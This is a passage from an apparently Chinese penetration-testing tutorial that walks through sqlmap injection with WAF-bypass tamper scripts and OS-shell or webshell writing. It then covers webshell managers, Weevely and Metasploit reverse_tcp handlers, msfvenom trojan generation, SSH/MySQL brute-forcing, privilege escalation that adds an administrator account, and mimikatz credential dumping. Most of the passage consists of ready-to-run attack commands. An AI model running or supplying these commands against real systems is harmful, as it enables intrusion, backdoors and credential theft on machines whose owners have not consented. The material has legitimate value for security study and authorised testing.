tfUPass</span><br></pre></td></tr></table></figure>\n\n<p>自动搜索注入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap-u [url]http://testasp.vulnweb.com/Login.asp[/url]--forms</span><br></pre></td></tr></table></figure>\n\n<p>指定参数注入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap-u [url]http://testasp.vulnweb.com/Login.asp[/url]--data &quot;tfUName=321&amp;tfUPass=321&quot;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"六、SQLMAP中Google搜索注入\"><a href=\"#六、SQLMAP中Google搜索注入\" class=\"headerlink\" title=\"六、SQLMAP中Google搜索注入\"></a>六、SQLMAP中Google搜索注入</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap-g inurl:php?id=</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"七、SQLMAP中的请求延迟\"><a href=\"#七、SQLMAP中的请求延迟\" class=\"headerlink\" title=\"七、SQLMAP中的请求延迟\"></a>七、SQLMAP中的请求延迟</h1><p>参数 –delay –safe-freq</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python sqlmap.py--dbs -u &quot;`http://xxx.cn/index.php/Index/view/id/40.html`&quot; --delay 1</span><br><span class=\"line\">python sqlmap.py--dbs -u &quot;`http://xxx.cn/index.php/Index/view/id/40.html`&quot; --safe-freq 3</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"八、SQLMAP绕过WAF防火墙\"><a href=\"#八、SQLMAP绕过WAF防火墙\" class=\"headerlink\" title=\"八、SQLMAP绕过WAF防火墙\"></a>八、SQLMAP绕过WAF防火墙</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*sqlmap-u [url]http://192.168.159.1/news.php?id=1[/url]-v3*` `*--dbs --batch --tamper &quot;space2morehash.py&quot;*</span><br></pre></td></tr></table></figure>\n\n<p>space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py</p>\n<p>都是编码方式</p>\n<p>space2hash.py base64encode.py charencode.py</p>\n<h1 id=\"九、SQLMAP查看权限\"><a href=\"#九、SQLMAP查看权限\" class=\"headerlink\" title=\"九、SQLMAP查看权限\"></a>九、SQLMAP查看权限</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap-u [url]http://192.168.159.1/news.php?id=1[/url]--privileges</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"十、SQLMAP伪静态注入-1-查找数据库\"><a href=\"#十、SQLMAP伪静态注入-1-查找数据库\" class=\"headerlink\" title=\"十、SQLMAP伪静态注入(1) 查找数据库\"></a>十、SQLMAP伪静态注入(1) 查找数据库</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python sqlmap.py-u&quot;`http://xxx.cn/index.php/Index/view/id/40.html`&quot;` `--dbs</span><br><span class=\"line\">python sqlmap.py-u&quot;`http://xxx.cn/index.php/Index/view/id/40.html`&quot;` `-D dataname--tables</span><br><span class=\"line\">python sqlmap.py-u&quot;`http://xxx.cn/index.php/Index/view/id/40.html`&quot;` `-D dataname-T tablename--columns</span><br><span class=\"line\">python sqlmap.py -u &quot;`http://xxx.cn/index.php/Index/view/id/40.html`&quot;` `-D dataname -T *tablename -C &quot;password&quot;*` `*--dump*</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"十一、SQLMAP注入点执行命令与交互写shell\"><a href=\"#十一、SQLMAP注入点执行命令与交互写shell\" class=\"headerlink\" title=\"十一、SQLMAP注入点执行命令与交互写shell\"></a>十一、SQLMAP注入点执行命令与交互写shell</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*sqlmap-u [url]http://192.168.159.1/news.php?id=1[/url]--os-cmd=ipconfig*</span><br><span class=\"line\">sqlmap-u [url]http://192.168.159.1/news.php?id=1[/url]--os-shell</span><br></pre></td></tr></table></figure>\n\n<p>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</p>\n<p>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p>\n<p>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap-r “c:\\request.txt”-pid` `–dbms mysql –file-dest “e:\\php\\htdocs\\dvwa\\inc\\include\\1.php” –file-write` `“f:\\webshell\\1112.php”</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n\n<p>——常见测试参数</p>\n<p>\\1.  指定参数进行测试</p>\n<p>参数：*号，和-p选项</p>\n<p>\\2.  使用post方式提交注入：参数：–data选项</p>\n<p>\\3.  sqlmap扫描等级（1-5）</p>\n<p>当-level的参数设定为2或者2以上的时候，sqlmap会尝试注入cookie参数。</p>\n<p>\\4.  自动执行默认选项</p>\n<p>参数：–batch</p>\n<p>\\5.  使用代理服务器连接到目标URL</p>\n<p>参数：–proxy</p>\n<p>\\6.  自动切换客户端请求</p>\n<p>参数：-random-agent</p>\n<p>\\7.  设置测试线程数，默认线程1</p>\n<p>参数：–threads</p>\n<p>\\8.  获取表中的数量</p>\n<p>参数：–count</p>\n<p>\\9.  风险等级共有四个等级，默认为1，2会增加基于事件的测试语句，3会增加or语句的SQL注入测试。</p>\n<p>参数：–risk</p>\n<p>——测试等级</p>\n<p>​    探测等级（1-5）：参数：–level</p>\n<p>​    共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload.</p>\n<p>​    这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。</p>\n<p>​    总之，在你不确定那个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</p>\n<p>​    风险等级：参数：–risk</p>\n<p>​    共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p>\n<p>​    在有些时候，例如在UPDATE的语句中，诸如一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。</p>\n<p>——命令操作</p>\n<p>\\1.  数据库操作</p>\n<p>–sql-shell 产生一个交互式的sql shell，用来执行sql命令</p>\n<p>​    \\2. 系统操作</p>\n<p>​       –os-shell 产生交互式的操作系统的shell，用来执行cmd命令。</p>\n<p>​       a). –os-shell系统操作的要求</p>\n<p>​           1). 网站必须是root权限</p>\n<p>​           2). 攻击者需要知道网站的绝对路径</p>\n<p>​           3). GPC为off，php主动转义的功能关闭</p>\n<p>​           4). secure_file_priv为空</p>\n<p>​       b). 使用—os-shell后会生成两个文件</p>\n<p>​           \\1. 上传脚本文件；2. 后门文件。</p>\n<p>——脚本介绍</p>\n<p>\\1.  脚本作用：帮助我们绕过一些waf，进行测试</p>\n<p>\\2.  脚本目录：Tamper目录下</p>\n<h2 id=\"sqlmap之sql注入二\"><a href=\"#sqlmap之sql注入二\" class=\"headerlink\" title=\"sqlmap之sql注入二\"></a>sqlmap之sql注入二</h2><p>——sqlmap小技巧</p>\n<p>\\1.  判断可注入的参数；</p>\n<p>\\2.  判断可以用哪种SQL注入技术来注入；</p>\n<p>\\3.  识别出哪种数据库；</p>\n<p>\\4.  根据用户选择，读取哪些数据。</p>\n<p>—sqlmap支持五种不同的注入模式：</p>\n<p>\\1.  基于布尔的盲注，即可以根据返回页面判断条件真假的注入；</p>\n<p>\\2.  基于时间的盲注，即不能根据页面返回的内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>\n<p>\\3.  基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>\n<p>\\4.  联合查询注入，可以使用union的情况下的注入。</p>\n<p>\\5.  堆查询注入，可以同时执行多条语句的执行时的注入。</p>\n<p>—sqlmap注入监测</p>\n<p>​    如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数。</p>\n<p>​    共有7个等级，默认为1.</p>\n<p>0、    只显示python错误以及严重的信息。</p>\n<p>1、    同时显示基本信息和警告信息。（默认）</p>\n<p>2、    同时显示debug信息。</p>\n<p>3、    同时显示注入的payload。</p>\n<p>4、    同时显示HTTP请求。</p>\n<p>5、    同时显示HTTP响应头。</p>\n<p>6、    同时显示HTTP响应页面。</p>\n<p>注：如果想看到sqlmap发送的测试payload最好的等级就是3.</p>\n<p>——Burp+sqlmap批量测试</p>\n<p>​    burpsuite导出log配合sqlmap批量扫描注入点。</p>\n<p>​    sqlmap可以批量扫描包含有request的日志文件，而request日志文件可以通过burpsuite来获取，因此通过sqlmap结合burpsuite工具，可以更加高效的对应用程序是否存在SQL注入漏洞进行地毯式的扫描。</p>\n<p>\\1.  首先是burp设置记录log，文件名任意。</p>\n<p>\\2.  把记录的log文件放在sqlmap目录下。</p>\n<p>\\3.  sqlmap读取log自动测试：</p>\n<p>python sqlmap.py -l 文件名 –batch -smart</p>\n<p>batch：自动选yes；  smart：启发式快速判断，节约时间。</p>\n<p>\\4.  最后能注入的URL会保存到out文件夹下。</p>\n<p>注意：log文件中如果有sqlmap无法读取的字符（ascII码之外的字符）会读取失败。</p>\n<p>​    —步骤</p>\n<p>\\1.  配置burpsuite下记录所有的request记录，并保存在指定文件夹。</p>\n<p>\\2.  执行命令：sqlmap.py -l burp.log –batch -smart 即可对burp.log中保存的所有request进行注入扫描。</p>\n<p>windows版的sqlmap最后能注入的URL都会保存在c:\\users\\administrator.sqlmap文件下。</p>\n<p>——sqlmap+burp</p>\n<p>\\1.  代理监听sqlmap测试语句</p>\n<p>python sqlmap.py -u <a href=\"http://xxxx/\">http://xxxx</a> –-proxy=<a href=\"http://127.0.0.1:8080/\">http://127.0.0.1:8080</a></p>\n<p>\\2.  sqlmap快速测试burp数据包</p>\n<p>-r参数，从文件中读取数据包</p>\n<p>​    \\3. 使用burp插件跑sqlmap注入。</p>\n<p>​       <a href=\"https://github.com/portswigger/co2\">https://github.com/portswigger/co2</a></p>\n<h2 id=\"Webshell管理工具\"><a href=\"#Webshell管理工具\" class=\"headerlink\" title=\"Webshell管理工具\"></a>Webshell管理工具</h2><p>——简介</p>\n<p>\\1.  “web”的含义是显然需要服务器开放web服务</p>\n<p>“shell”的含义是取得对服务器某种程度上操作权限</p>\n<p>\\2.  使用者</p>\n<p>站长：网站管理、服务器管理、管理数据库等</p>\n<p>入侵者：后门程序、控制服务器、达到目的等</p>\n<p>​    简称：后门，入侵者为了达到目的以及作为控制对方的后门文件。</p>\n<p>——大马小马一句话</p>\n<p>\\1.  小马：文件体积较小、上传文件、文件修改、文件管理</p>\n<p>\\2.  大马（不推荐）</p>\n<p>文件体积较大、功能齐全、能够提权、操作数据库等</p>\n<p>\\3.  一句话木马（主流）</p>\n<p>短小精悍、功能强大、隐藏性好、客户端直接管理</p>\n<p>——中国菜刀</p>\n<p>​    它是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要 ，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英式编译，支持多国语言输入显示。</p>\n<p>\\1.  安装：<a href=\"http://www.maicaidao.co/\">http://www.maicaidao.co/</a></p>\n<p>\\2.  使用：图形化操作</p>\n<p>webshell管理工具是渗透人员常用的连接工具。</p>\n<p>——中国蚁剑</p>\n<p>​    它是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。是一款非常优秀的webshell管理工具。</p>\n<p>\\1.  安装</p>\n<p>加载器：<a href=\"https://github.com/AntSwordProject/AntSword-Loader\">https://github.com/AntSwordProject/AntSword-Loader</a></p>\n<p>​      蚁剑源码：<a href=\"https://github.com/AntSwordProject/antSword\">https://github.com/AntSwordProject/antSword</a></p>\n<p>​       首先下载加载器，以及源码，使用加载器加载源码即可</p>\n<p>\\2.  使用</p>\n<p>图形化操作：开源、跨平台、图形化、webshell管理工具</p>\n<p>——冰蝎Behinder</p>\n<p>​    作为新型加密网站管理客户端，冰蝎算是作为中国菜刀的替代者。</p>\n<p>\\1.  安装：<a href=\"https://github.com/rebeyond/Behinder/releases\">https://github.com/rebeyond/Behinder/releases</a></p>\n<p>运行环境：jre6~jre8：<a href=\"https://www.java.com/\">https://www.java.com</a></p>\n<p>\\2.  使用：图形化操作</p>\n<h2 id=\"Linux-shell-Weevely\"><a href=\"#Linux-shell-Weevely\" class=\"headerlink\" title=\"Linux shell Weevely\"></a>Linux shell Weevely</h2><p>——简介</p>\n<p>​    它是一款使用python编译的webshell工具，集webshell生成和连接于一身，采用c/s模式构建，可以算作是linux下的一款php菜刀替代工具，具有很好的隐蔽性。</p>\n<p>​    在linux上使用时还是很好的，集服务器错误配置审计，后门放置，暴力破解，文件管理，资源搜索，网络代理，命令执行，数据库操作，系统信息收集及端口扫描等功能。</p>\n<p>​    地址：<a href=\"https://github.com/epinna/weevely3\">https://github.com/epinna/weevely3</a></p>\n<p>​    其他webshell管理工具（扩展）：中国菜刀、C刀、中国蚁剑、冰蝎、XISE</p>\n<p>——使用</p>\n<p>\\1.  生成shell：weevely generate <password> &lt;文件名&gt;</p>\n<p>\\2.  连接shell：weevely <URL> <password> [cmd]</p>\n<p>\\3.  生成混淆shell：weevely generate -obfuscator cleartext1_php <password> &lt;文件名&gt;</p>\n<p>——模块</p>\n<p>\\1.  信息收集</p>\n<p>:system_info 收集系统信息</p>\n<p>:system_info -info client_ip 查找自己连接ip</p>\n<p>\\2.  文件管理</p>\n<p>:file_touch 修改文件时间</p>\n<p>:file_touch -human-ts ‘2018-09-15 20:41:20’ 文件名</p>\n<p>\\3.  命令执行</p>\n<p>:shell_php 执行PHP命令</p>\n<p>:shell_php system(‘ipconfig’)；</p>\n<p>​    —生成meterpreter会话</p>\n<p>​       :backdoor_meterpreter -payload php/meterpreter/reverse_tcp -lhost 本机IP -port 端口</p>\n<p>​    —MSF设置</p>\n<p>​       use exploit multi/handler</p>\n<p>​       show payloads</p>\n<p>​       set payload php/meterpreter/reverse_tcp</p>\n<p>​       show options</p>\n<p>​       set lhost 本机IP</p>\n<p>​       run</p>\n<h1 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h1><h2 id=\"Metasploit框架与基本命令\"><a href=\"#Metasploit框架与基本命令\" class=\"headerlink\" title=\"Metasploit框架与基本命令\"></a>Metasploit框架与基本命令</h2><p>——简介</p>\n<p>​    它是一个免费的、可下载的框架，通过它可以很容易的获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。</p>\n<p>——模块</p>\n<p>​    综合渗透测试框架</p>\n<p>​    Auxiliary 辅助模块 为渗透测试信息收集提供了大量的辅助模块支持</p>\n<p>​    Exploits 攻击模块 利用发现的安全漏洞或配置弱点对远程目标系统进行攻击，从而获得对远程目标系统访问权的代码组件</p>\n<p>​    Payload 攻击载荷模块 攻击成功后促使靶机运行的一段植入代码</p>\n<p>​    Post 后渗透攻击模块 收集更多信息或进一步访问被利用的目标系统</p>\n<p>​    Encoders 编码模块 将攻击载荷进行编码，来绕过防护软件拦截</p>\n<p>——MSF基础指令</p>\n<p>​    help/?     帮助菜单</p>\n<p>​    exit        退出MSF控制台</p>\n<p>​    Back       返回上一级</p>\n<p>​    info       显示一个或多个模块的信息</p>\n<p>​    show      显示所给类型的模块</p>\n<p>​    background 将当前操作在后台进行</p>\n<p>​    use        使用所选择的模块</p>\n<p>​    set        设置选项</p>\n<p>​    unset      取消设置的选项</p>\n<p>​    显示所有的exploit模块：show exploits</p>\n<p>​    显示模块信息：info windows/smb/ms17_010_eternalblue</p>\n<p>——MSF实践</p>\n<p>​    开启数据库：service postgresql start</p>\n<p>​    初始化msf数据库：msfdb init</p>\n<p>​    开启MSF：msfconsole</p>\n<p>​    查看数据连接状态：db_status</p>\n<p>——常用模块粗讲</p>\n<p>​    Auxiliary模块：show auxiliary</p>\n<p>​    命名规则：功能/服务/名称     scanner/smb/smb_ms17_010</p>\n<p>​    Exploits模块：show exploits</p>\n<p>​    rank表示好用级别：normal，excellent，good，average</p>\n<p>​    命名规则：操作系统/服务/名称    windows/smb/ms17_010_eternalblue</p>\n<p>​    Payload模块：命名规则：操作系统/类型/名称 windows/x64/meterpreter/reverse_tcp</p>\n<p>——msf搜索应用</p>\n<p>​    根据名称搜索：search ms17_010</p>\n<p>​    联合搜索：search name:ms17 type:auxiliary</p>\n<p>​    设置模块：use auxiliary/scanner/smb/smb_ms17_010</p>\n<p>​    查看选项：options</p>\n<p>——MSF主机管理</p>\n<p>​    命令：hosts    通过该命令可以添加主机以及删除主机等</p>\n<p>​    列出当前mac地址：hosts -c mac</p>\n<h2 id=\"MSF-扫描模块\"><a href=\"#MSF-扫描模块\" class=\"headerlink\" title=\"MSF-扫描模块\"></a>MSF-扫描模块</h2><p>——信息收集</p>\n<p>​    —获取whois信息：whois xxx.com</p>\n<p>通过whois等信息组合生成针对性的密码字典</p>\n<p>​    密码存在规律性，可破解性，对应性（撞库）</p>\n<p>​    在线密码生成：<a href=\"https://www.bugku.com/mima/\">https://www.bugku.com/mima/</a></p>\n<p>​    PoCBox辅助测试平台：<a href=\"https://github.com/gh0stkey/PoCBox\">https://github.com/gh0stkey/PoCBox</a></p>\n<p>​    密码字典生成工具：phpstudy卡伊码：<a href=\"http://127.0.0.1/PoCBox-master/\">http://127.0.0.1/PoCBox-master/</a></p>\n<p>​           测试账号：<a href=\"mailto:test123@163.com\">test123@163.com</a></p>\n<p>​    密码泄露查询：<a href=\"https://monitor.firefox.com/\">https://monitor.firefox.com/</a></p>\n<p>​                  <a href=\"https://haveibeenpwned.com/\">https://haveibeenpwned.com/</a></p>\n<p>​    历史whois：<a href=\"https://www.benmi.com/whoishistory/\">https://www.benmi.com/whoishistory/</a></p>\n<p>​    注册网站：<a href=\"https://www.reg007.com/\">https://www.reg007.com/</a></p>\n<p>​    —DNS记录解析查询工具</p>\n<p>​       nslookup</p>\n<p>​       两种模式：</p>\n<p>\\1.  非交互模式：nslookup -qt=类型 目标域名（默认查询类型时a地址记录IPV4）</p>\n<p>nslookup -qt=类型 目标域名 指定的DNS服务器IP或域名</p>\n<p>​       \\2. 交互模式：nslookup    进入交互模式</p>\n<p>​           set qt=类型        指定查询类型，默认设置为a，IP或域名</p>\n<p>​           set at=另一个类型     切换查询类型</p>\n<p>​           help or ?          查看帮助</p>\n<p>​           exit           退出nslookup交互模式</p>\n<p>​       域名解析记录：</p>\n<p>​           <a href=\"https://www.22.cn/help_34.html\">https://www.22.cn/help_34.html</a></p>\n<p>​           <a href=\"https://www.cnblogs.com/liyuanhong/articles/7355153.html\">https://www.cnblogs.com/liyuanhong/articles/7355153.html</a></p>\n<p>​       在线nslookup：<a href=\"http://tool.chinaz.com/nslookup/\">http://tool.chinaz.com/nslookup/</a></p>\n<p>​       DNS域传送漏洞：<a href=\"https://www.cnblogs.com/h4ck0ne/p/5154651.html\">https://www.cnblogs.com/h4ck0ne/p/5154651.html</a></p>\n<p>——扫描模块</p>\n<p>​    —db_nmap 常用的端口扫描指令</p>\n<p>​        -sU：UDP扫描                  -sT：TCP扫描</p>\n<p>​        -sV：扫描系统版本和程序版本检测</p>\n<p>​        -n：禁止反向域名解析            -R：反向域名解析</p>\n<p>​        -6：启用IPV6扫描               –script=vuln 全面的漏洞扫描</p>\n<p>​        漏洞扫描，命令：</p>\n<p>​           db_nmap –script=vuln 192.168.1.2</p>\n<p>​           使用vuln脚本进行全面的漏洞扫描</p>\n<p>​        指纹识别扫描，命令：</p>\n<p>​           db_nmap -sV -v 192.168.1.2</p>\n<p>​        扫描系统和程序版本号检测，并且输出详细信息</p>\n<p>​    —自动化扫描插件wmap</p>\n<p>​       使用命令：</p>\n<p>​           msf&gt;load wmap    加载插件</p>\n<p>​           msf&gt;wmap_sites -a url  添加目标</p>\n<p>​           msf&gt;wmap_targets -t url   添加目标URL地址</p>\n<p>​           msf&gt;wmap_run -e     测试目标</p>\n<p>​           msf&gt;wmap_vulns      查看漏洞详细信息</p>\n<p>——漏洞库-searchsploit</p>\n<p>​    离线漏洞数据库搜索工具：searchsploit -t ftp</p>\n<p>​    离线漏洞数据库帮助我们在测试时找到对方的POC或者利用脚本</p>\n<p>​    手册：<a href=\"https://www.exploit-db.com/searchsploit\">https://www.exploit-db.com/searchsploit</a></p>\n<h2 id=\"MSF密码爆破模块\"><a href=\"#MSF密码爆破模块\" class=\"headerlink\" title=\"MSF密码爆破模块\"></a>MSF密码爆破模块</h2><p>——常见的加密方式</p>\n<p>​    —MD5加密：常见的密码验证算法，用于操作系统的登陆认证</p>\n<p>​       明文密码：存在规律性，可破解性，对应性（撞库）</p>\n<p>​       密文：使用加密算法，唯一性，不可伪造性，不可逆性</p>\n<p>​       常见的hash加密：<a href=\"https://www.jianshu.com/p/0d53b9b5631e\">https://www.jianshu.com/p/0d53b9b5631e</a></p>\n<p>​                         <a href=\"https://cmd5.com/\">https://cmd5.com/</a></p>\n<p>在线工具箱：<a href=\"https://tool.bugku.com/\">https://tool.bugku.com/</a></p>\n<p>​    —验证hash值</p>\n<p>​       windows自带工具验证hash值：</p>\n<p>certutil /? 查看帮助    certutil -hashfile 1.jpg MD5 查看文件MD5值</p>\n<p>作用：1. 验证文件是否损坏</p>\n<p>​            2.验证文件是否被修改（后门）</p>\n<p>案例：<a href=\"https://www.freebuf.com/articles/paper/147403.html\">https://www.freebuf.com/articles/paper/147403.html</a></p>\n<p>​      <a href=\"https://www.qianxin.com/other/CVE-2019-0708\">https://www.qianxin.com/other/CVE-2019-0708</a></p>\n<p>——密码生成工具-genpAss</p>\n<p>​    中国特色的弱口令生成器</p>\n<p>​    指令： -n  名字   -u  用户名     -q  QQ号     -e  邮箱   -m 手机号</p>\n<p>​           -b  生日，格式：2000-01-01      -c  公司名     -o  导出文件</p>\n<p>​    地址：<a href=\"https://github.com/RicterZ/genpAss\">https://github.com/RicterZ/genpAss</a></p>\n<p>​    安全趣闻：<a href=\"https://www.freebuf.com/sectool/197414.html\">https://www.freebuf.com/sectool/197414.html</a></p>\n<p>​    密码泄露查询：<a href=\"https://haveibeenpwned.com/Passwords\">https://haveibeenpwned.com/Passwords</a></p>\n<p>——查找爆破模块</p>\n<p>​    查找关键词：login     msf&gt;search type:auxiliary login</p>\n<p>​    查找服务名：msf&gt;search type:auxiliary name:ssh</p>\n<p>​    查找服务名+关键词：msf&gt;search type:auxiliary name:phpMyAdmin login</p>\n<p>——实战密码爆破</p>\n<p>​    通过信息收集进行针对性的密码爆破</p>\n<p>\\1.  SSH密码爆破：模块名：auxiliary/scanner/ssh/ssh_login</p>\n<p>\\2.  mysql密码爆破：模块名：auxiliary/scanner/mysql/mysql_login</p>\n<p>\\3.  phpmyadmin登陆验证爆破：模块名：auxiliary/scanner/http/phpMyAdmin_login</p>\n<h2 id=\"MSF-漏洞利用模块\"><a href=\"#MSF-漏洞利用模块\" class=\"headerlink\" title=\"MSF-漏洞利用模块\"></a>MSF-漏洞利用模块</h2><p>——快速搭建测试环境</p>\n<p>​    使用phpstudy快速进行环境配置</p>\n<p>​    它是一个PHP调试环境的程序集成包。</p>\n<p>​    集成：Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer，一次性安装，无须配置即可使用，是非常方便，好用的PHP调试环境，该程序不仅包括PHP调试环境，还包括了开发工具、开法手册等。</p>\n<p>​    下载地址：<a href=\"http://www.phpstudy.net/\">http://www.phpstudy.net</a></p>\n<p>​    配置问题：<a href=\"http://www.xp.cn/wenda/388.html\">http://www.xp.cn/wenda/388.html</a></p>\n<p>​    运行库：<a href=\"http://www.php.cn/xiazai/gongju/1351\">http://www.php.cn/xiazai/gongju/1351</a></p>\n<p>——phpmyadmin获取webshell</p>\n<p>​    phpmyadmin日志写shell</p>\n<p>​    前提：条件是root用户。思路：利用mysql的一个日志文件，这个日志文件每执行一个sql语句就会将其执行的保存。将这个日志文件重命名为shell.php，然后执行一条sql带一句话木马的命令。然后执行菜刀连接。</p>\n<p>设置导出文件：编辑general log，general log file</p>\n<p><a href=\"http://localhost/phpMyAdmin/index.php?token=c8c6084b26ebe891a039ca9f2d171876\">http://localhost/phpMyAdmin/index.php?token=c8c6084b26ebe891a039ca9f2d171876</a></p>\n<p>参考文章：<a href=\"https://www.jianshu.com/p/ddd41b841c36\">https://www.jianshu.com/p/ddd41b841c36</a></p>\n<p>——实战演示：phpmyadmin</p>\n<p>​    从漏洞扫描到漏洞利用</p>\n<p>​    扫描靶机：msf&gt;auxiliary/scanner/http/phpadmin_login</p>\n<p>​    选择exploit：use exploit/multi/http/phpMyAdmin_lfi_rce</p>\n<p>​    选择payload：set payload php/meterpreter/reverse_tcp</p>\n<p>​    攻击：run/exploit</p>\n<p>——反弹shell</p>\n<p>​    连接一般分为正向连接和反向连接：</p>\n<p>正向连接为：对方服务器开放端口，让我们去访问，例如使用：telnet 127.0.0.1:80</p>\n<p>反向连接为：我们开放端口，让对方访问，例如，反弹shell</p>\n<p>反弹shell：reverse shell，就是控制端监听在某tcp/udp端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。</p>\n<p>​    为什么要反弹shell：1. 某客户机中了你的网马，但是它在局域网内，你直接连接不了，他的ip会动态改变，不能持续控制。</p>\n<p>\\2.  由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>\n<p>\\3.  对于病毒、木马，受害者什么时候能中招，对方的网络环境怎样，什么时候开机都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>\n<p>攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>\n<p>参考文章：<a href=\"https://xz.aliyun.com/t/2549\">https://xz.aliyun.com/t/2549</a></p>\n<p>——通过反弹shell获得的会话的常用命令</p>\n<p>​    文件系统命令</p>\n<p>​    edit    编辑文件      getlwd     显示本地工作目录</p>\n<p>​    dir     列出目标文件目录     mkdir  创建目录</p>\n<p>​    网络、系统命令</p>\n<p>​    ifconfig    显示网络接口信息     netstat     显示网络连接信息</p>\n<p>​    execute    执行命令      ps     列出正在运行的进程</p>\n<p>​    sysinfo     获取远程系统的有关信息，例如OS</p>\n<p>​    用户界面命令</p>\n<p>​    getdesktop     获取当前用户桌面</p>\n<p>​    screenshot     获取目标截图</p>\n<p>​    授权、密码命令</p>\n<p>​    getsystem     尝试获取系统权限</p>\n<p>​    hashdump     获取目标NTDUMP</p>\n<h2 id=\"MSF拿到shell后提权\"><a href=\"#MSF拿到shell后提权\" class=\"headerlink\" title=\"MSF拿到shell后提权\"></a>MSF拿到shell后提权</h2><p>——信息收集-目的-权限提升</p>\n<p>​    目的：拿到管理员密码</p>\n<p>\\1.  通过phpmyadmin漏洞拿到webshell</p>\n<p>\\2.  权限提升：使用exp提权补丁进行权限提升，从用户权限到管理员权限：windows提权工具 <a href=\"https://github.com/SecWiki/windows-kernel-exploits\">https://github.com/SecWiki/windows-kernel-exploits</a></p>\n<p>使用MSF后渗透测试脚本提权。</p>\n<p>——信息收集-提权辅助工具</p>\n<p>​    快速查找exp提权补丁进行提权</p>\n<p>\\1.  在线辅助网页：在线比对补丁查找exp: <a href=\"https://bugs.hacking8.com/tiquan/\">https://bugs.hacking8.com/tiquan/</a></p>\n<p>\\2.  提权辅助工具：<a href=\"https://github.com/GDSSecurity/Windows-Exploit-Suggester\">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p>\n<p>——windows-exploit-suggester</p>\n<p>​    从漏洞扫描到漏洞利用</p>\n<p>​    suggester要求：python安装xlrd</p>\n<p>​    安装xlrd：pip install xlrd –upgrade</p>\n<p>​    先更新漏洞库：python windows-exploit-suggester.py –update</p>\n<p>​    扫描systeminfo信息：这个系统可以提权的补丁有哪些</p>\n<p>​    python windows-exploit-suggester.py -database 2019-12-06-mssb.xls –systeminfo sys.txt</p>\n<p>​    审计本地可利用漏洞信息</p>\n<p>​    python windows-exploit-suggester.py –audit -l –database 2019-12-06-mssb.xls –systeminfo sys.txt</p>\n<p>​    未使用补丁该系统可能存在的漏洞</p>\n<p>​    python windows-exploit-suggester.py -database 2019-12-06-mssb.xls –ostext ‘Windows 7’</p>\n<p>——提权补丁：MS15-051</p>\n<p>​    使用exp提取补丁创建用户</p>\n<p>​    net user a a.1 /add：添加用户并设置密码</p>\n<p>​    net localgroup administators a /add：将用户加入管理组</p>\n<p>——MSF提权</p>\n<p>​    使用MSF信息收集模块-查看提权脚本补丁</p>\n<p>​    本地提权信息收集模块</p>\n<p>​    use post/multi/recon/local_exploit_suggester</p>\n<p>​    创建一个基础木马：msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.221.138 lport=1520 -f exe -o shell.exe</p>\n<p>——提权的姿势</p>\n<p>\\1.  绕过UAC进行提权</p>\n<p>\\2.  提供程序运行级别（runas）</p>\n<p>这种方法可以利用exploit/windows/local/ask模块，但是该模块实际上只是以高权限重启一个返回式shellcode，并没有绕过UAC，会触发系统UAC，受害机器有提示，提示用户是否要运行，如果用户选择yes，就可以返回一个高权限meterpreter shell（需要执行getsystem）</p>\n<p>\\3.  利用windows提权漏洞进行提权</p>\n<p>Ms13_053,ms14_058,ms16_016,ms16_032,</p>\n<p>如exploit/windows/local/ms14_058_track_popup_menu</p>\n<p>——获取管理员密码</p>\n<p>​    —通过mimikatz获取管理员密码</p>\n<p>​        windows使用指令：需要管理员权限</p>\n<p>​        mimikatz.exe log</p>\n<p>​        mimikatz # privilege::debug</p>\n<p>​        mimikatz # sekurlsa::logonpasswords</p>\n<p>​       mimikatz # 